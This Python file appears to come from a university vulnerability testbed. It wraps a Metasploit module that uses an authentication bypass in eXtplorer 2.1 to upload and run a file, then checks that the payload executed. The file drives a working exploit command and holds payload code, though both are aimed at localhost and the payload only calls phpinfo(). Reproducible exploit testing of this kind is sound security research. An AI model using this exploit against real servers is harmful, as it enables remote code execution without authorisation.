
# Copyright 2013 University of Maryland.  All rights reserved.
# Use of this source code is governed by a BSD-style
# license that can be found in the LICENSE.TXT file.


import sys
import os
import time
import urllib2
import re
import subprocess


import selenium.common.exceptions
import framework

class Exploit (framework.Exploit):

    attributes = {'Name' :        "OSVDB_88751",
                  'Description' : "eXtplorer v2.1 Arbitrary File Upload Vulnerability\n"
                                  "This application has an upload feature that allows an authenticated user "
			          "with administrator roles to upload arbitrary files to any writable "
				  "directory in the web root. This module uses an authentication bypass "
				  "vulnerability to upload and execute a file.",
                  'References' :  [['OSVDB', '88751']],
                  'Target' :      "eXtplorer 2.1",
                  'TargetLicense' : '',
                  'VulWikiPage' : "",
                  'Type' : 'EXEC'
                  }

    def __init__(self, visible=False):
        framework.Exploit.__init__(self, visible)
        self.msf_out = ""
        return
            
    def exploit(self):
        metasploit_cmd = "lib/metasploit-framework/msfcli multi/http/extplorer_upload_exec "\
                         "RHOST=127.0.0.1 TARGETURI=/extplorer/ PAYLOAD=generic/custom PAYLOADSTR=\'phpinfo();\' E"
        self.logger.info("Running Metasploit")

        proc = subprocess.Popen(metasploit_cmd, stdout=subprocess.PIPE, shell=True)
        (self.msf_out, err) = proc.communicate()
        self.logger.info(self.msf_out)
        self.logger.info("Done! Browse to the payload location specified above to see the results.")

        return

    def verify(self):
        recomp = re.compile('.*Executing payload \((.+)\).*', re.MULTILINE)
        path = recomp.findall(self.msf_out)
        
        if(len(path) != 1):
            return False

        self.logger.info("Checking payload at http://127.0.0.1/%s", path[0])
        
        try:
            response = urllib2.urlopen("http://127.0.0.1/%s" % (path[0],))
            html = response.read()
        except IOError:
            self.logger.error("IOError: unable to open url")
            return False

        if(html.find("PHP Logo") != -1):
            self.logger.info("payload confirmed")
            return True

        self.logger.info("payload not found")
        return False
